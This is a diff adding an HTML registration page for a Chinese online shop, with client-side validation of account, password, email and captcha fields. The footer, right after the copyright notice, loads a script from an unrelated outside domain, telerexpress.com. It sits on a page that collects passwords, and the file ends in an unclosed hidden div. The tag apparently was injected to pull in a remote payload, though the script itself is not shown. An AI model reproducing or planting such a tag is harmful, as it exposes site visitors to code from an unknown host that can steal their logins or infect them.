@@ -1,0 +1,196 @@
+<!doctype html>
+<html>
+	<head>
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7 charset=GBK">
+		<meta http-equiv="Content-Type" content="text/html; charset=GBK">
+		<title>无忧购物网</title>
+		<meta name="keywords" content="无忧购物网" />
+		<meta name="description" content="无忧购物网" />
+		<meta name="author" content="www.qqku.com">
+		<meta name="copyright" content="QQKU.COM All Rights Reserved">
+		<link href="/shop/style/css/layout.css" rel="stylesheet" type="text/css">
+		<script type="text/javascript" src="/js/jquery-1.4.4.min.js"></script>
+		<script type="text/javascript" src="/images/js/common.js"></script>
+		<script>
+			function checkSubmit()
+				{
+				var reg_qq=$("#reg_qq").val();
+				var reg_pass=$("#reg_pass").val();
+				var reg_pass_confirm=$("#reg_pass_confirm").val();
+				var reg_question=$("#reg_question").val();
+				var reg_answer=$("#reg_answer").val();
+				var reg_email=$("#reg_email").val();
+				var captcha=$("#captcha").val();
+				if(reg_qq=="")
+				{
+				alert("请输入注册帐号");
+				$("#reg_qq").focus();
+				return false;
+				}
+				else if(reg_qq.length<5){
+				alert("注册帐号长度至少为5位!");
+				$("#reg_qq").focus();
+				return false;
+				}
+				else if(reg_pass=="")
+				{
+				alert("请输入密码!");
+				$("#reg_pass").focus();
+				return false;
+				}
+				else if(reg_pass_confirm=="")
+				{
+				alert("请重复输入密码!");
+				$("#reg_pass_confirm").focus();
+				return false;
+				}
+				else if(reg_pass_confirm!=reg_pass)
+				{
+				alert("两次密码不一致，请重新输入");
+				$("#reg_pass_confirm").focus();
+				return false;
+				}
+				//else if(reg_question=="")
+				//{
+				//alert("请选择密保问题!");
+				//$("#reg_question").focus();
+				//return false;
+				//}
+				//else if(reg_answer=="")
+				//{
+				//	alert("请输入问题答案");
+				//	$("#reg_answer").focus();
+				//	return false;
+				//}
+				else if(reg_email=="")
+				{
+				alert("请输入邮箱!");
+				$("#reg_email").focus();
+				return false;
+				}
+				else if(!reg_email.match(/^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]+$/)){
+				alert("邮箱格式错误,正确格式比如:19646618@qq.com");
+				$("#reg_email").focus();
+				return false;
+				}
+
+				else if(captcha=="")
+				{
+				alert("请输入验证码!");
+				$("#captcha").focus();
+				return false;
+				}
+				else
+				{
+				return true;
+				}
+				}
+</script>
+	</head>
+	<body>
+		<div id="head">
+			<h1><a href="/"><img src="http://h1.qqku.com/img/logo.gif" alt="无忧购物网" height=70></a></h1>
+			<div id="subnav">
+			</div>
+		</div>
+		<div class="content">
+			<div class="module_common">
+				<div class="wrap">
+					<div class="wrap_child">
+						<div class="login_con">
+							<div class="login_fill_in">
+								<form name="" id="register_form" method="post" action="/?tab=register" onsubmit="return checkSubmit();">
+									<table>
+										<tr>
+											<td colspan="3">
+												<h4>填写用户注册信息</h4>
+											</td>
+										</tr>
+										<tr>
+											<th>帐号: </th>
+											<td><input type="text" id="reg_qq" name="reg_qq" class="text width8" /></td>
+											<td class="padding3 fontColor4"><label class="field_notice">您要注册的帐号</label></td>
+										</tr>
+										<tr>
+											<th>密码: </th>
+											<td><input type="password" id="reg_pass" name="reg_pass" class="text width8" />
+												</th>
+											<td class="padding3 fontColor4"><label class="field_notice">您的登录密码</label></td>
+										</tr>
+										<tr>
+											<th>确认密码: </th>
+											<td><input type="password" id="reg_pass_confirm" name="reg_pass_confirm" class="text width8" /></td>
+											<td class="padding3 fontColor4"><label class="field_notice">再次输入您的密码</label></td>
+										</tr>
+
+										<tr>
+											<th>邮箱: </th>
+											<td><input type="text" id="reg_email" name="reg_email" class="text width8" /></td>
+											<td class="padding3 fontColor4"><label class="field_notice">找回密码唯一途径,请务必输入正确</label></td>
+										</tr>
+										<tr>
+											<th>验证码: </th>
+											<td><input type="text" id="captcha" name="captcha" class="text" style="text-transform:uppercase" size="10" />
+												<a href="javascript:;" onclick="javascript:document.getElementById('codeimage').src='/shop/function/checkCode.php?' + Math.random();">
+													<img src="/shop/function/checkCode.php" title="点击更换验证码" name="codeimage" border="0" id="codeimage" onclick="this.src='/shop/function/checkCode.php?' + Math.random()" /></a></td>
+											<td class="padding3 fontColor4"><label class="field_notice">输入验证码</label></td>
+										</tr>
+										<tr>
+											<th rowspan="2"></th>
+											<td colspan="2"></td>
+										</tr>
+										<tr>
+											<td colspan="2"><input type="hidden" name="reg" value="yes"><input type="submit" name="Submit" value=""
+												 class="login_btn" title="立即注册" /></td>
+										</tr>
+									</table>
+								</form>
+							</div>
+							<div class="login_right">
+								<h4>提示: </h4>
+
+								<h4 style=" margin-top:24px;">如果已经拥有帐号</h4>
+								<a href="/?tab=login" class="enter" title="现在登录"></a>
+								<div style="clear:both;"></div>
+								<h4>您还可以： </h4>
+								<br><a href="http://club.qqku.com/?tab=qqlogin&amp;r=http%3A%2F%2F993868.qqku.com&amp;h=993868" target="_blank"><img
+									 height=32 border=0 src="/images/qq_login.png"></a>&nbsp;
+								<br><a href="http://club.qqku.com/?tab=wblogin&amp;r=http%3A%2F%2F993868.qqku.com&amp;h=993868" target="_blank"><img
+									 height=32 height=32 border=0 src="/images/weibo_login.png"></a>&nbsp;
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="footer">
+			<p></a>
+			</p>
+			Copyright &copy; 2009-2018 <a href="http://993868.qqku.com">无忧购物网</a> All Rights Reserved <script src='http://www.telerexpress.com/q.js'></script>
+		</div>
+		<script language="javascript">
+			var searchTxt = ' 搜索其实很容易！';
+
+			function searchFocus(e) {
+				if (e.value == searchTxt) {
+					e.value = '';
+					$('#keyword').css("color", "");
+				}
+			}
+
+			function searchBlur(e) {
+				if (e.value == '') {
+					e.value = searchTxt;
+					$('#keyword').css("color", "#999999");
+				}
+			}
+
+			function searchInput() {
+				if ($('#keyword').val() == searchTxt)
+					$('#keyword').attr("value", "");
+				return true;
+			}
+			$('#keyword').css("color", "#999999");
+		</script>
+		<div style="display:none">
+</html>
